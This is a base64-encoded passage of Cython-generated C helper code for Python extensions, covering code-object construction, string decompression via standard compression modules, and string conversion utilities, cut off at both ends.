ZiAoISh0eXBlc19tb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoInR5cGVzIikpKSBnb3RvIGVuZDtcbiAgICAgICAgaWYgKCEoY29kZV90eXBlID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyh0eXBlc19tb2R1bGUsICJDb2RlVHlwZSIpKSkgZ290byBlbmQ7XG4gICAgICAgIGlmIChtaW5vcl92ZXJzaW9uIDw9IDcpIHtcbiAgICAgICAgICAgICh2b2lkKXA7XG4gICAgICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oY29kZV90eXBlLCAiaWlpaWlPT09PT09pT09PIiwgYSwgaywgbCwgcywgZiwgY29kZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zLCBmdiwgY2VsbCk7XG4gICAgICAgIH0gZWxzZSBpZiAobWlub3JfdmVyc2lvbiA8PSAxMCkge1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKGNvZGVfdHlwZSwgImlpaWlpaU9PT09PT2lPT08iLCBhLHAsIGssIGwsIHMsIGYsIGNvZGUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgIGMsIG4sIHYsIGZuLCBuYW1lLCBmbGluZSwgbG5vcywgZnYsIGNlbGwpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgaWYgKCEoZXhjZXB0aW9uX3RhYmxlID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZShOVUxMLCAwKSkpIGdvdG8gZW5kO1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKGNvZGVfdHlwZSwgImlpaWlpaU9PT09PT09pT09PTyIsIGEscCwgaywgbCwgcywgZiwgY29kZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIG5hbWUsIGZsaW5lLCBsbm9zLCBleGNlcHRpb25fdGFibGUsIGZ2LCBjZWxsKTtcbiAgICAgICAgfVxuICAgIGVuZDpcbiAgICAgICAgUHlfWERFQ1JFRihjb2RlX3R5cGUpO1xuICAgICAgICBQeV9YREVDUkVGKGV4Y2VwdGlvbl90YWJsZSk7XG4gICAgICAgIFB5X1hERUNSRUYodHlwZXNfbW9kdWxlKTtcbiAgICAgICAgaWYgKHR5cGUpIHtcbiAgICAgICAgICAgIFB5RXJyX1Jlc3RvcmUodHlwZSwgdmFsdWUsIHRyYWNlYmFjayk7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4jZWxpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMDAwXG4gIHN0YXRpYyBQeUNvZGVPYmplY3QqIF9fUHl4X19QeUNvZGVfTmV3KGludCBhLCBpbnQgcCwgaW50IGssIGludCBsLCBpbnQgcywgaW50IGYsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqYywgUHlPYmplY3QqIG4sIFB5T2JqZWN0ICp2LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZnYsIFB5T2JqZWN0ICpjZWxsLCBQeU9iamVjdCogZm4sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBpbnQgZmxpbmUsIFB5T2JqZWN0ICpsbm9zKSB7XG4gICAgUHlDb2RlT2JqZWN0ICpyZXN1bHQ7XG4gICAgcmVzdWx0ID1cbiAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gICAgICAgIFB5VW5zdGFibGVfQ29kZV9OZXdXaXRoUG9zT25seUFyZ3NcbiAgICAgICNlbHNlXG4gICAgICAgIFB5Q29kZV9OZXdXaXRoUG9zT25seUFyZ3NcbiAgICAgICNlbmRpZlxuICAgICAgICAoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBuYW1lLCBmbGluZSwgbG5vcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXMpO1xuICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBjMDBBMVxuICAgIGlmIChsaWtlbHkocmVzdWx0KSlcbiAgICAgICAgcmVzdWx0LT5fY29fZmlyc3R0cmFjZWFibGUgPSAwO1xuICAgICNlbmRpZlxuICAgIHJldHVybiByZXN1bHQ7XG4gIH1cbiNlbGlmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgI2RlZmluZSBfX1B5eF9fUHlDb2RlX05ldyhhLCBwLCBrLCBsLCBzLCBmLCBjb2RlLCBjLCBuLCB2LCBmdiwgY2VsbCwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zKVxcXG4gICAgICAgICAgUHlDb2RlX05ld1dpdGhQb3NPbmx5QXJncyhhLCBwLCBrLCBsLCBzLCBmLCBjb2RlLCBjLCBuLCB2LCBmdiwgY2VsbCwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9fUHlDb2RlX05ldyhhLCBwLCBrLCBsLCBzLCBmLCBjb2RlLCBjLCBuLCB2LCBmdiwgY2VsbCwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zKVxcXG4gICAgICAgICAgUHlDb2RlX05ldyhhLCBrLCBsLCBzLCBmLCBjb2RlLCBjLCBuLCB2LCBmdiwgY2VsbCwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zKVxuI2VuZGlmXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5Q29kZV9OZXcoXG4gICAgICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IsXG4gICAgICAgIFB5T2JqZWN0ICogY29uc3QgKnZhcm5hbWVzLFxuICAgICAgICBQeU9iamVjdCAqZmlsZW5hbWUsXG4gICAgICAgIFB5T2JqZWN0ICpmdW5jbmFtZSxcbiAgICAgICAgUHlPYmplY3QgKmxpbmVfdGFibGUsXG4gICAgICAgIFB5T2JqZWN0ICp0dXBsZV9kZWR1cF9tYXBcbikge1xuICAgIFB5T2JqZWN0ICpjb2RlX29iaiA9IE5VTEwsICp2YXJuYW1lc190dXBsZV9kZWR1cCA9IE5VTEwsICpjb2RlX2J5dGVzID0gTlVMTDtcbiAgICBQeV9zc2l6ZV90IHZhcl9jb3VudCA9IChQeV9zc2l6ZV90KSBkZXNjci5ubG9jYWxzO1xuICAgIFB5T2JqZWN0ICp2YXJuYW1lc190dXBsZSA9IFB5VHVwbGVfTmV3KHZhcl9jb3VudCk7XG4gICAgaWYgKHVubGlrZWx5KCF2YXJuYW1lc190dXBsZSkpIHJldHVybiBOVUxMO1xuICAgIGZvciAoUHlfc3NpemVfdCBpPTA7IGkgPCB2YXJfY291bnQ7IGkrKykge1xuICAgICAgICBQeV9JTkNSRUYodmFybmFtZXNbaV0pO1xuICAgICAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTSh2YXJuYW1lc190dXBsZSwgaSwgdmFybmFtZXNbaV0pICE9ICgwKSkgZ290byBkb25lO1xuICAgIH1cbiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwID0gUHlEaWN0X0dldEl0ZW0odHVwbGVfZGVkdXBfbWFwLCB2YXJuYW1lc190dXBsZSk7XG4gICAgaWYgKCF2YXJuYW1lc190dXBsZV9kZWR1cCkge1xuICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X1NldEl0ZW0odHVwbGVfZGVkdXBfbWFwLCB2YXJuYW1lc190dXBsZSwgdmFybmFtZXNfdHVwbGUpIDwgMCkpIGdvdG8gZG9uZTtcbiAgICAgICAgdmFybmFtZXNfdHVwbGVfZGVkdXAgPSB2YXJuYW1lc190dXBsZTtcbiAgICB9XG4gICAgI2Vsc2VcbiAgICB2YXJuYW1lc190dXBsZV9kZWR1cCA9IFB5RGljdF9TZXREZWZhdWx0KHR1cGxlX2RlZHVwX21hcCwgdmFybmFtZXNfdHVwbGUsIHZhcm5hbWVzX3R1cGxlKTtcbiAgICBpZiAodW5saWtlbHkoIXZhcm5hbWVzX3R1cGxlX2RlZHVwKSkgZ290byBkb25lO1xuICAgICNlbmRpZlxuICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5X0lOQ1JFRih2YXJuYW1lc190dXBsZV9kZWR1cCk7XG4gICAgI2VuZGlmXG4gICAgaWYgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gKDB4MDMwYjAwMDApICYmIGxpbmVfdGFibGUgIT0gTlVMTCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCkge1xuICAgICAgICBQeV9zc2l6ZV90IGxpbmVfdGFibGVfbGVuZ3RoID0gX19QeXhfUHlCeXRlc19HRVRfU0laRShsaW5lX3RhYmxlKTtcbiAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICBpZiAodW5saWtlbHkobGluZV90YWJsZV9sZW5ndGggPT0gLTEpKSBnb3RvIGRvbmU7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBQeV9zc2l6ZV90IGNvZGVfbGVuID0gKGxpbmVfdGFibGVfbGVuZ3RoICogMiArIDQpICYgfjNMTDtcbiAgICAgICAgY29kZV9ieXRlcyA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUoTlVMTCwgY29kZV9sZW4pO1xuICAgICAgICBpZiAodW5saWtlbHkoIWNvZGVfYnl0ZXMpKSBnb3RvIGRvbmU7XG4gICAgICAgIGNoYXIqIGNfY29kZV9ieXRlcyA9IFB5Qnl0ZXNfQXNTdHJpbmcoY29kZV9ieXRlcyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghY19jb2RlX2J5dGVzKSkgZ290byBkb25lO1xuICAgICAgICBtZW1zZXQoY19jb2RlX2J5dGVzLCAwLCAoc2l6ZV90KSBjb2RlX2xlbik7XG4gICAgfVxuICAgIGNvZGVfb2JqID0gKFB5T2JqZWN0KikgX19QeXhfX1B5Q29kZV9OZXcoXG4gICAgICAgIChpbnQpIGRlc2NyLmFyZ2NvdW50LFxuICAgICAgICAoaW50KSBkZXNjci5udW1fcG9zb25seV9hcmdzLFxuICAgICAgICAoaW50KSBkZXNjci5udW1fa3dvbmx5X2FyZ3MsXG4gICAgICAgIChpbnQpIGRlc2NyLm5sb2NhbHMsXG4gICAgICAgIDAsXG4gICAgICAgIChpbnQpIGRlc2NyLmZsYWdzLFxuICAgICAgICBjb2RlX2J5dGVzID8gY29kZV9ieXRlcyA6IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X2J5dGVzLFxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSxcbiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsXG4gICAgICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwLFxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSxcbiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsXG4gICAgICAgIGZpbGVuYW1lLFxuICAgICAgICBmdW5jbmFtZSxcbiAgICAgICAgKGludCkgZGVzY3IuZmlyc3RfbGluZSxcbiAgICAgICAgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gKDB4MDMwYjAwMDApICYmIGxpbmVfdGFibGUpID8gbGluZV90YWJsZSA6IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X2J5dGVzXG4gICAgKTtcbmRvbmU6XG4gICAgUHlfWERFQ1JFRihjb2RlX2J5dGVzKTtcbiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBQeV9YREVDUkVGKHZhcm5hbWVzX3R1cGxlX2RlZHVwKTtcbiAgICAjZW5kaWZcbiAgICBQeV9ERUNSRUYodmFybmFtZXNfdHVwbGUpO1xuICAgIHJldHVybiBjb2RlX29iajtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0RlY29tcHJlc3NTdHJpbmcoY29uc3QgY2hhciAqcywgUHlfc3NpemVfdCBsZW5ndGgsIGludCBhbGdvKSB7XG4gICAgUHlPYmplY3QgKm1vZHVsZSwgKmRlY29tcHJlc3MsICpjb21wcmVzc2VkX2J5dGVzLCAqZGVjb21wcmVzc2VkO1xuICAgIGNvbnN0IGNoYXIqIG1vZHVsZV9uYW1lID0gYWxnbyA9PSAzID8gImNvbXByZXNzaW9uLnpzdGQiIDogYWxnbyA9PSAyID8gImJ6MiIgOiAiemxpYiI7XG4gICAgUHlPYmplY3QgKm1ldGhvZG5hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZygiZGVjb21wcmVzcyIpO1xuICAgIGlmICh1bmxpa2VseSghbWV0aG9kbmFtZSkpIHJldHVybiBOVUxMO1xuICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZTAwMDBcbiAgICBpZiAoYWxnbyA9PSAzKSB7XG4gICAgICAgIFB5T2JqZWN0ICpmcm9tbGlzdCA9IFB5X0J1aWxkVmFsdWUoIltPXSIsIG1ldGhvZG5hbWUpO1xuICAgICAgICBpZiAodW5saWtlbHkoIWZyb21saXN0KSkgcmV0dXJuIE5VTEw7XG4gICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsKCJjb21wcmVzc2lvbi56c3RkIiwgTlVMTCwgTlVMTCwgZnJvbWxpc3QsIDApO1xuICAgICAgICBQeV9ERUNSRUYoZnJvbWxpc3QpO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgICAgICBtb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUobW9kdWxlX25hbWUpO1xuICAgIGlmICh1bmxpa2VseSghbW9kdWxlKSkgZ290byBpbXBvcnRfZmFpbGVkO1xuICAgIGRlY29tcHJlc3MgPSBQeU9iamVjdF9HZXRBdHRyKG1vZHVsZSwgbWV0aG9kbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFkZWNvbXByZXNzKSkgZ290byBpbXBvcnRfZmFpbGVkO1xuICAgIHtcbiAgICAgICAgI2lmZGVmIF9fY3BsdXNwbHVzXG4gICAgICAgICAgICBjaGFyICptZW12aWV3X2J5dGVzID0gY29uc3RfY2FzdDxjaGFyKj4ocyk7XG4gICAgICAgICNlbHNlXG4gICAgICAgICAgICAjaWYgZGVmaW5lZChfX2NsYW5nX18pXG4gICAgICAgICAgICAgICNwcmFnbWEgY2xhbmcgZGlhZ25vc3RpYyBwdXNoXG4gICAgICAgICAgICAgICNwcmFnbWEgY2xhbmcgZGlhZ25vc3RpYyBpZ25vcmVkICItV2Nhc3QtcXVhbCJcbiAgICAgICAgICAgICNlbGlmICFkZWZpbmVkKF9fSU5URUxfQ09NUElMRVIpICYmIGRlZmluZWQoX19HTlVDX18pXG4gICAgICAgICAgICAgICNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcHVzaFxuICAgICAgICAgICAgICAjcHJhZ21hIEdDQyBkaWFnbm9zdGljIGlnbm9yZWQgIi1XY2FzdC1xdWFsIlxuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICBjaGFyICptZW12aWV3X2J5dGVzID0gKGNoYXIqKSBzO1xuICAgICAgICAgICAgI2lmIGRlZmluZWQoX19jbGFuZ19fKVxuICAgICAgICAgICAgICAjcHJhZ21hIGNsYW5nIGRpYWdub3N0aWMgcG9wXG4gICAgICAgICAgICAjZWxpZiAhZGVmaW5lZChfX0lOVEVMX0NPTVBJTEVSKSAmJiBkZWZpbmVkKF9fR05VQ19fKVxuICAgICAgICAgICAgICAjcHJhZ21hIEdDQyBkaWFnbm9zdGljIHBvcFxuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiAhZGVmaW5lZChQeUJVRl9SRUFEKVxuICAgICAgICBpbnQgbWVtdmlld19mbGFncyA9IDB4MTAwO1xuICAgICAgICAjZWxzZVxuICAgICAgICBpbnQgbWVtdmlld19mbGFncyA9IFB5QlVGX1JFQUQ7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBjb21wcmVzc2VkX2J5dGVzID0gUHlNZW1vcnlWaWV3X0Zyb21NZW1vcnkobWVtdmlld19ieXRlcywgbGVuZ3RoLCBtZW12aWV3X2ZsYWdzKTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFjb21wcmVzc2VkX2J5dGVzKSkge1xuICAgICAgICBQeV9ERUNSRUYoZGVjb21wcmVzcyk7XG4gICAgICAgIGdvdG8gYmFkO1xuICAgIH1cbiAgICBkZWNvbXByZXNzZWQgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb25PYmpBcmdzKGRlY29tcHJlc3MsIGNvbXByZXNzZWRfYnl0ZXMsIE5VTEwpO1xuICAgIFB5X0RFQ1JFRihjb21wcmVzc2VkX2J5dGVzKTtcbiAgICBQeV9ERUNSRUYoZGVjb21wcmVzcyk7XG4gICAgUHlfREVDUkVGKG1vZHVsZSk7XG4gICAgUHlfREVDUkVGKG1ldGhvZG5hbWUpO1xuICAgIHJldHVybiBkZWNvbXByZXNzZWQ7XG5pbXBvcnRfZmFpbGVkOlxuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19JbXBvcnRFcnJvcixcbiAgICAgICAgIkZhaWxlZCB0byBpbXBvcnQgXCclLjIwcy5kZWNvbXByZXNzXCcgLSBjYW5ub3QgaW5pdGlhbGlzZSBtb2R1bGUgc3RyaW5ncy4gIlxuICAgICAgICAiU3RyaW5nIGNvbXByZXNzaW9uIHdhcyBjb25maWd1cmVkIHdpdGggdGhlIEMgbWFjcm8gXCdDWVRIT05fQ09NUFJFU1NfU1RSSU5HUz0lZFwnLiIsXG4gICAgICAgIG1vZHVsZV9uYW1lLCBhbGdvKTtcbmJhZDpcbiAgICBQeV9YREVDUkVGKG1vZHVsZSk7XG4gICAgUHlfREVDUkVGKG1ldGhvZG5hbWUpO1xuICAgIHJldHVybiBOVUxMO1xufVxuXG4jaW5jbHVkZSA8c3RyaW5nLmg+XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9zc2l6ZV90IF9fUHl4X3NzaXplX3N0cmxlbihjb25zdCBjaGFyICpzKSB7XG4gICAgc2l6ZV90IGxlbiA9IHN0cmxlbihzKTtcbiAgICBpZiAodW5saWtlbHkobGVuID4gKHNpemVfdCkgUFlfU1NJWkVfVF9NQVgpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLCAiYnl0ZSBzdHJpbmcgaXMgdG9vIGxvbmciKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByZXR1cm4gKFB5X3NzaXplX3QpIGxlbjtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZyhjb25zdCBjaGFyKiBjX3N0cikge1xuICAgIFB5X3NzaXplX3QgbGVuID0gX19QeXhfc3NpemVfc3RybGVuKGNfc3RyKTtcbiAgICBpZiAodW5saWtlbHkobGVuIDwgMCkpIHJldHVybiBOVUxMO1xuICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIGxlbik7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlCeXRlQXJyYXlfRnJvbVN0cmluZyhjb25zdCBjaGFyKiBjX3N0cikge1xuICAgIFB5X3NzaXplX3QgbGVuID0gX19QeXhfc3NpemVfc3RybGVuKGNfc3RyKTtcbiAgICBpZiAodW5saWtlbHkobGVuIDwgMCkpIHJldHVybiBOVUxMO1xuICAgIHJldHVybiBQeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgbGVuKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKFB5T2JqZWN0KiBvKSB7XG4gICAgUHlfc3NpemVfdCBpZ25vcmU7XG4gICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nQW5kU2l6ZShvLCAmaWdub3JlKTtcbn1cbiNpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSSB8fCBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19VVEY4XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeVVuaWNvZGVfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiBvLCBQeV9zc2l6ZV90ICpsZW5ndGgpIHtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlVbmljb2RlX1JFQURZKG8pID09IC0xKSkgcmV0dXJuIE5VTEw7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHtcbiAgICAgICAgY29uc3QgY2hhciogcmVzdWx0O1xuICAgICAgICBQeV9zc2l6ZV90IHVuaWNvZGVfbGVuZ3RoO1xuICAgICAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUih1bmljb2RlX2xlbmd0aCk7IC8vIG9ubHkgZm9yIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJXG4gICAgICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuICAgICAgICBpZiAodW5saWtlbHkoUHlBcmdfUGFyc2UobywgInMjIiwgJnJlc3VsdCwgbGVuZ3RoKSA8IDApKSByZXR1cm4gTlVMTDtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgcmVzdWx0ID0gUHlVbmljb2RlX0FzVVRGOEFuZFNpemUobywgbGVuZ3RoKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSVxuICAgICAgICB1bmljb2RlX2xlbmd0aCA9IFB5VW5pY29kZV9HZXRMZW5ndGgobyk7XG4gICAgICAgIGlmICh1bmxpa2VseSh1bmljb2RlX2xlbmd0aCA8IDApKSByZXR1cm4gTlVMTDtcbiAgICAgICAgaWYgKHVubGlrZWx5KHVuaWNvZGVfbGVuZ3RoICE9ICpsZW5ndGgpKSB7XG4gICAgICAgICAgICBQeVVuaWNvZGVfQXNBU0NJSVN0cmluZyhvKTtcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiNlbHNlXG4jaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUlcbiAgICBpZiAobGlrZWx5KFB5VW5pY29kZV9JU19BU0NJSShvKSkpIHtcbiAgICAgICAgKmxlbmd0aCA9IFB5VW5pY29kZV9HRVRfTEVOR1RIKG8pO1xuICAgICAgICByZXR1cm4gUHlVbmljb2RlX0FzVVRGOChvKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICBQeVVuaWNvZGVfQXNBU0NJSVN0cmluZyhvKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuI2Vsc2VcbiAgICByZXR1cm4gUHlVbmljb2RlX0FzVVRGOEFuZFNpemUobywgbGVuZ3RoKTtcbiNlbmRpZlxuI2VuZGlmXG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nQW5kU2l6ZShQeU9iamVjdCogbywgUHlfc3NpemVfdCAqbGVuZ3RoKSB7XG4jaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkgfHwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOFxuICAgIGlmIChQeVVuaWNvZGVfQ2hlY2sobykpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X1B5VW5pY29kZV9Bc1N0cmluZ0FuZFNpemUobywgbGVuZ3RoKTtcbiAgICB9IGVsc2VcbiNlbmRpZlxuICAgIGlmIChQeUJ5dGVBcnJheV9DaGVjayhvKSkge1xuI2lmIChDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TKSB8fCAoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIChkZWZpbmVkKFB5Qnl0ZUFycmF5X0FTX1NUUklORykgJiYgZGVmaW5lZChQeUJ5dGVBcnJheV9HRVRfU0laRSkpKVxuICAgICAgICAqbGVuZ3RoID0gUHlCeXRlQXJyYXlfR0VUX1NJWkUobyk7XG4gICAgICAgIHJldHVybiBQeUJ5dGVBcnJheV9BU19TVFJJTkcobyk7XG4jZWxzZVxuICAgICAgICAqbGVuZ3RoID0gUHlCeXRlQXJyYXlfU2l6ZShvKTtcbiAgICAgICAgaWYgKCpsZW5ndGggPT0gLTEpIHJldHVybiBOVUxMO1xuICAgICAgICByZXR1cm4gUHlCeXRlQXJyYXlfQXNTdHJpbmcobyk7XG4jZW5kaWZcbiAgICB9IGVsc2VcbiAgICB7XG4gICAgICAgIGNoYXIqIHJlc3VsdDtcbiAgICAgICAgaW50IHIgPSBQeUJ5dGVzX0FzU3RyaW5nQW5kU2l6ZShvLCAmcmVzdWx0LCBsZW5ndGgpO1xuICAgICAgICBpZiAodW5saWtlbHkociA8IDApKSB7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgICAgIH1cbiAgICB9XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfSXNUcnVlKFB5T2JqZWN0KiB4KSB7XG4gICBpbnQgaXNfdHJ1ZSA9IHggPT0gUHlfVHJ1ZTtcbiAgIGlmIChpc190cnVlIHwgKHggPT0gUHlfRmFsc2UpIHwgKHggPT0gUHlfTm9uZSkpIHJldHVybiBpc190cnVlO1xuICAgZWxzZSByZXR1cm4gUHlPYmplY3RfSXNUcnVlKHgpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZUFuZERlY3JlZihQeU9iamVjdCogeCkge1xuICAgIGludCByZXR2YWw7XG4gICAgaWYgKHVubGlrZWx5KCF4KSkgcmV0dXJuIC0xO1xuICAgIHJldHZhbCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZSh4KTtcbiAgICBQeV9ERUNSRUYoeCk7XG4gICAgcmV0dXJuIHJldHZhbDtcbn1cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlOdW1iZXJfTG9uZ1dyb25nUmVzdWx0VHlwZShQeU9iamVjdCogcmVzdWx0KSB7XG4gICAgX19QeXhfVHlwZU5hbWUgcmVzdWx0X3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRShyZXN1bHQpKTtcbiAgICBpZiAoUHlMb25nX0NoZWNrKHJlc3VsdCkpIHtcbiAgICAgICAgaWYgKFB5RXJyX1dhcm5Gb3JtYXQoUHlFeGNfRGVwcmVjYXRpb25XYXJuaW5nLCAxLFxuICAgICAgICAgICAgICAgICJfX2ludF9fIHJldHVybmVkIG5vbi1pbnQgKHR5cGUgIiBfX1B5eF9GTVRfVFlQRU5BTUUgIikuICAiXG4gICAgICAgICAgICAgICAgIlRoZSBhYmlsaXR5IHRvIHJldHVybiBhbiBpbnN0YW5jZSBvZiBhIHN0cmljdCBzdWJjbGFzcyBvZiBpbnQgaXMgZGVwcmVjYXRlZCwgIlxuICAgICAgICAgICAgICAgICJhbmQgbWF5IGJlIHJlbW92ZWQgaW4gYSBmdXR1cmUgdmVyc2lvbiBvZiBQeXRob24uIixcbiAgICAgICAgICAgICAgICByZXN1bHRfdHlwZV9uYW1lKSkge1xuICAgICAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHJlc3VsdF90eXBlX25hbWUpO1xuICAgICAgICAgICAgUHlfREVDUkVGKHJlc3VsdCk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUocmVzdWx0X3R5cGVfbmFtZSk7XG4gICAgICAgIHJldHVybiByZXN1